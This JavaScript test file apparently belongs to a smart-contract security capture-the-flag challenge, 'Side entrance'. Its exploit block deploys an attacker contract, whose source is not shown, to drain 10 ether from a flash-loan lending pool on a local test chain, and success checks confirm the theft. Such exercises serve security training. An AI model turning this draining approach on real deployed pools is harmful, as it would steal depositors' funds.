const chai = require("chai");
const waffle = require("ethereum-waffle");
chai.use(waffle.solidity);
const BN = require("bn.js");
// Enable and inject BN dependency - https://www.chaijs.com/plugins/chai-bn/
chai.use(require("chai-bn")(BN));
const expect = chai.expect;

contract("[Challenge] Side entrance", (accounts) => {
  let deployer, attacker;

  const ETHER_IN_POOL = web3.utils.toWei("10", "ether");

  before(async function () {
    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
    [deployer, attacker] = accounts;

    const SideEntranceLenderPoolFactory = artifacts.require(
      "SideEntranceLenderPool"
    );
    this.pool = await SideEntranceLenderPoolFactory.new({ from: deployer });

    // const attackBal = (await web3.eth.getBalance(attacker)).toString();
    // const deployBal = (await web3.eth.getBalance(deployer)).toString();
    // console.log("Values: ", { attacker: attackBal, deployer: deployBal, ETHER_IN_POOL });
    /*
        100000000000000000000 Attacker
         99998566968250000000 Deployer
         10000000000000000000 ETHER_IN_POOL
    */
    await this.pool.deposit({ value: ETHER_IN_POOL });
    this.attackerInitialEthBalance = await web3.eth.getBalance(attacker);
    expect(
      await web3.eth.getBalance(this.pool.address)
    ).to.be.a.bignumber.equal(ETHER_IN_POOL);
  });

  it("Exploit", async function () {
    /** CODE YOUR EXPLOIT HERE */
    const SideEntranceAttackerFacory = artifacts.require(
      "SideEntranceAttacker"
    );
    const attackerContract = await SideEntranceAttackerFacory.new(
      this.pool.address,
      attacker,
      { from: attacker }
    );
    await attackerContract.attack(ETHER_IN_POOL);
  });

  after(async function () {
    /** SUCCESS CONDITIONS */
    expect(
      await web3.eth.getBalance(this.pool.address)
    ).to.be.a.bignumber.equal("0");

    // Not checking exactly how much is the final balance of the attacker,
    // because it'll depend on how much gas the attacker spends in the attack
    // If there were no gas costs, it would be balance before attack + ETHER_IN_POOL
    expect(await web3.eth.getBalance(attacker)).to.be.a.bignumber.gt(
      this.attackerInitialEthBalance
    );
  });
});
